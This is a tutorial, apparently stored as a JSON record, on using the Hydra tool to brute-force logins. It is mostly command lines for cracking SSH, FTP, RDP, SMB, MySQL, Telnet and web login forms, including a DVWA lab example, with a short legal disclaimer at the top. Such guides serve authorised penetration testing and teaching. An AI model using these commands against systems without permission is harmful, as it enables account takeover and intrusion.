        "title": "How to Use Hydra to Crack Passwords: The Complete Guide",
        "content": "###How to Use Hydra to Crack Passwords: The Complete Guide\n\n### **Disclaimer**\n\nBefore you begin, remember that using Hydra against a system you do not own or have explicit permission to test is illegal. Unauthorized scanning or hacking can lead to severe legal consequences .\n\n---\n\n### **Part 1: How to Use Hydra - The Basics**\n\nThese commands cover the fundamental syntax and options. We will use placeholders like `<username>` or `passwords.txt`. You need to replace these with your actual targets and file paths.\n\n#### **Step 1: Basic Syntax & Getting Help**\n\nStart by familiarizing yourself with the tool and its help menu.\n\n```bash\n# Display the main help menu with all options\nhydra -h\n```\n```bash\n# Show help for a specific service module (e.g., http-post-form)\nhydra http-post-form -U\n```\n```bash\n# List all services supported by Hydra\nhydra -h | grep \"Supported services\"\n```\n\n#### **Step 2: Core Attack Syntax**\n\nHere is how to structure your commands for different scenarios.\n\n*   **Single username & single password:**\n    ```bash\n    hydra -l <username> -p <password> <server> <service>\n    ```\n\n*   **Username list & password list (Dictionary Attack):**\n    ```bash\n    hydra -L <username_list.txt> -P <password_list.txt> <server> <service>\n    ```\n\n*   **Using a file with `username:password` pairs:**\n    ```bash\n    hydra -C <username_password_pairs.txt> <server> <service>\n    ```\n\n#### **Step 3: Essential Command-Line Options**\n\nAdd these flags to `[options]` in your command to control the attack.\n\n*   `-t <number>`: Number of parallel threads (default is 16). Be careful not to overload the target or get blocked.\n    ```bash\n    hydra -l admin -P passwords.txt -t 4 <server> ssh\n    ```\n*   `-vV`: Very verbose mode. This shows each login attempt in real-time, which is great for debugging.\n    ```bash\n    hydra -l admin -P passwords.txt <server> ssh -vV\n    ```\n*   `-f` or `-F`: Exit the program after the first successful login/password pair is found.\n    ```bash\n    hydra -L users.txt -P passwords.txt <server> ssh -f\n    ```\n*   `-o <output_file.txt>`: Save the results (successful logins) to a file.\n    ```bash\n    hydra -L users.txt -P passwords.txt <server> ssh -o valid_creds.txt\n    ```\n*   `-s <port>`: Specify a non-default port for the service.\n    ```bash\n    hydra -l admin -P passwords.txt <server> -s 2222 ssh\n    ```\n*   `-e nsr`: Try additional password permutations.\n    *   `n`: Try a null password (empty string).\n    *   `s`: Try the username itself as the password.\n    *   `r`: Try the username reversed as the password.\n    ```bash\n    hydra -l admin -P passwords.txt <server> ssh -e nsr\n    ```\n*   `-x min:max:charset`: Generate passwords on the fly. `1` for numbers, `a` for lowercase, `A` for uppercase.\n    ```bash\n    # Generate passwords length 4-6 with numbers and lowercase\n    hydra -l admin -x 4:6:a1 <server> ssh\n    ```\n\n---\n\n### **Part 2: Practical Use Cases (Live Commands)**\n\nNow, let's apply these options to specific services.\n\n#### **Scenario 1: Brute Forcing a Website Login (HTTP POST Form)**\n\nThis is one of the most common uses of Hydra. You need to inspect the web page's HTML to find the form details.\n\n1.  **Identify the Login Form Details:** Look at the page source. You need:\n    *   The **URL path** (e.g., `/login.php` or `/DVWA/vulnerabilities/brute/`).\n    *   The **name attributes** of the username and password fields (e.g., `username` and `password`).\n    *   A **failure string** that appears on the page when login fails (e.g., \"Invalid password\" or \"Login failed\").\n\n2.  **Construct and Run the Command:**\n    The syntax is: `http-post-form \"<path>:<field_name>=^USER^&<field_name2>=^PASS^:<failure_string>\"`\n\n    ```bash\n    # Example 1: Generic login form\n    hydra -L users.txt -P passwords.txt <target_ip> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=incorrect\"\n    ```\n\n    ```bash\n    # Example 2: DVWA (Damn Vulnerable Web Application) specific example\n    # Using a single username 'admin' and a password list\n    hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form \"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.\"\n    ```\n\n#### **Scenario 2: Brute Forcing SSH**\n\nAttacking an SSH service is straightforward. By default, it runs on port 22.\n\n*   **Attack with username list and password list:**\n    ```bash\n    hydra -L users.txt -P passwords.txt ssh://<target_ip>\n    ```\n*   **Attack with a single username:**\n    ```bash\n    hydra -l root -P passwords.txt <target_ip> ssh\n    ```\n*   **Attack on a non-standard SSH port (e.g., 2222):**\n    ```bash\n    hydra -L users.txt -P passwords.txt -s 2222 <target_ip> ssh\n    ```\n\n#### **Scenario 3: Brute Forcing FTP**\n\nThe syntax is very similar to SSH.\n\n*   **Attack with username list and password list:**\n    ```bash\n    hydra -L users.txt -P passwords.txt ftp://<target_ip>\n    ```\n*   **Attack with a single username:**\n    ```bash\n    hydra -l user -P passwords.txt <target_ip> ftp\n    ```\n\n#### **Scenario 4: Brute Forcing Other Common Services**\n\nHydra supports many other protocols. Here are examples for a few.\n\n*   **RDP (Remote Desktop Protocol):** Be careful with threads (`-t 1`) as RDP is sensitive.\n    ```bash\n    hydra -t 1 -V -f -l administrator -P passwords.txt rdp://<target_ip>\n    ```\n*   **SMB (Server Message Block):**\n    ```bash\n    hydra -l administrator -P passwords.txt smb://<target_ip>\n    ```\n*   **MySQL Database:**\n    ```bash\n    hydra -l root -P passwords.txt mysql://<target_ip>\n    ```\n*   **Telnet:**\n    ```bash\n    hydra -L users.txt -P passwords.txt telnet://<target_ip>\n    ```\n\n### **Summary Table of Live Commands**\n\n| **Target Service** | **Example Command** | **Description** |\n| :--- | :--- | :--- |\n| **HTTP-POST** | `hydra -l admin -P pass.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"` | Brute forces a web login form. |\n| **SSH** | `hydra -L users.txt -P pass.txt ssh://192.168.1.1` | Brute forces SSH service. |\n| **FTP** | `hydra -L users.txt -P pass.txt ftp://192.168.1.1` | Brute forces FTP service. |\n| **RDP** | `hydra -t 1 -V -f -l admin -P pass.txt rdp://192.168.1.1` | Brute forces RDP (use 1 thread). |\n| **SMB** | `hydra -l admin -P pass.txt smb://192.168.1.1` | Brute forces Windows SMB service. |\n| **MySQL** | `hydra -l root -P pass.txt mysql://192.168.1.1` | Brute forces MySQL database login. |\n| **HTTP-GET** | `hydra -L users.txt -P pass.txt http-get://192.168.1.1/admin` | Brute forces HTTP Basic Authentication. |\n\nThis guide provides you with the building blocks. You can mix and match the options from Part 1 with the service examples in Part 2 to create a command for almost any situation. Good luck, and remember to hack responsibly"
